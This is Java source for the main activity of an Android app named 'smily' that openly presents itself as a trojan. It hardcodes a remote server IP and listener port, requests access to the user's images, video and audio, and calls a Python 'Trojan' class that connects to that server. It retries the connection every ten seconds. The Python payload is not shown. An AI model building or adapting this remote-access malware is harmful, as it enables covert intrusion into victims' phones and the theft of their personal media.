
// I have used android studio to build this apk. This is the main java file

package com.example.smily;

import androidx.appcompat.app.AppCompatActivity;
import android.os.Bundle;
import android.Manifest;

import android.content.pm.PackageManager;
import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.widget.Toast;
import com.chaquo.python.PyObject;
import com.chaquo.python.Python;
import com.chaquo.python.android.AndroidPlatform;

public class MainActivity extends AppCompatActivity {
    private static final int REQUEST_PERMISSIONS_CODE = 1;
    private static final String TAG = "TrojanApp";
    private static final String host = "13.234.75.219"; //ip of server
    private static final int port = 27000; //port which will be same on listener
    private static final String PYTHON_SCRIPT = "main";
    private static final int RECONNECT_INTERVAL = 10000; //keep reconnecting 10 sec interval

    private final Handler reconnectHandler = new Handler(Looper.getMainLooper());
    private Runnable reconnectRunnable;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // Check and request permissions
        checkAndRequestPermissions();

        // Initialize Python
        if (!Python.isStarted()) {
            Python.start(new AndroidPlatform(this));
        }

        // Attempt connection initially
        connectToServer();

        // Set up the reconnect mechanism
        reconnectRunnable = new Runnable() {
            @Override
            public void run() {
                Log.d(TAG, "Reattempting to connect to server...");
                connectToServerInBackground();  // Reconnect attempt every 10 minutes
                reconnectHandler.postDelayed(this, RECONNECT_INTERVAL);
            }
        };

        // Start the reconnect mechanism
        reconnectHandler.postDelayed(reconnectRunnable, RECONNECT_INTERVAL);
    }

    // Method to handle connection on a background thread
    private void connectToServerInBackground() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                connectToServer();  // Call the actual connection logic on a background thread
            }
        }).start();
    }

    private void connectToServer() {
        try {
            // Access the Python script
            Python python = Python.getInstance();
            PyObject pyModule = python.getModule(PYTHON_SCRIPT);

            // Call the connect_to_server function in Python
            PyObject trojan = pyModule.get("Trojan");
            PyObject trojanInstance = trojan.call(host, port);
            PyObject response = trojanInstance.callAttr("connect_to_server");

            // Handle server response
            if (response.toString().equals("success")) {
                Log.d(TAG, "Connected to server successfully.");
            } else {
                Log.d(TAG, "Failed to connect to server.");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error connecting to server: ", e);
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        // Stop the reconnect handler when the activity is destroyed
        reconnectHandler.removeCallbacks(reconnectRunnable);
    }
    private void checkAndRequestPermissions() {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES)
                    != PackageManager.PERMISSION_GRANTED ||
                    ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VIDEO)
                            != PackageManager.PERMISSION_GRANTED ||
                    ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_AUDIO)
                            != PackageManager.PERMISSION_GRANTED) {

                ActivityCompat.requestPermissions(this,
                        new String[]{
                                Manifest.permission.READ_MEDIA_IMAGES,
                                Manifest.permission.READ_MEDIA_VIDEO,
                                Manifest.permission.READ_MEDIA_AUDIO},
                        REQUEST_PERMISSIONS_CODE);
            }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode,
                                           @NonNull String[] permissions,
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQUEST_PERMISSIONS_CODE) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                // Permission granted, proceed with accessing media files
                Toast.makeText(this, "Successfully added permissions.", Toast.LENGTH_SHORT).show();
            } else {
                // Permission denied, handle accordingly
                Toast.makeText(this, "Permissions required to access media files.", Toast.LENGTH_SHORT).show();
            }
        }
    }
}
